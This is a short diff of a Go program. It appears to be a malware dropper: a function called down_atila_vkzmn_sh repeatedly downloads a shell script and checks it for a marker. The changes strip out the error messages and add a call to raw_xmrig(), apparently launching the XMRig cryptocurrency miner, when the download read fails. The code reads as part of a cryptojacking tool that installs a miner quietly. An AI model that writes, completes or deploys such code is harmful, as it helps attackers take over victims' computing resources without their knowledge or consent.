@@ -1,7 +1,7 @@
 package main
 
 import (
-	"fmt"
+
 	"io/ioutil"
 	"net/http"
 )
@@ -23,7 +23,6 @@ func down_atila_vkzmn_sh() {
 
 		if err_get != nil {
 
-			fmt.Println(err_get) //tente abaixa denovo
 
 			continue
 
@@ -31,11 +30,17 @@ func down_atila_vkzmn_sh() {
 
 		down_bytes, err_readall := ioutil.ReadAll(resp.Body)
 
+
+
 		if err_readall != nil {
 
-			fmt.Println("erro em readall")
+	
 
-			return
+			raw_xmrig()  //
+
+
+
+
 
 		}
 
@@ -43,7 +48,10 @@ func down_atila_vkzmn_sh() {
 
 		//verify  if  atila_vkzmn.sh  is  created , read the magic byte ATILA_VKZMN
 
+
 		magic_byte()
+
+
 
 	}
 
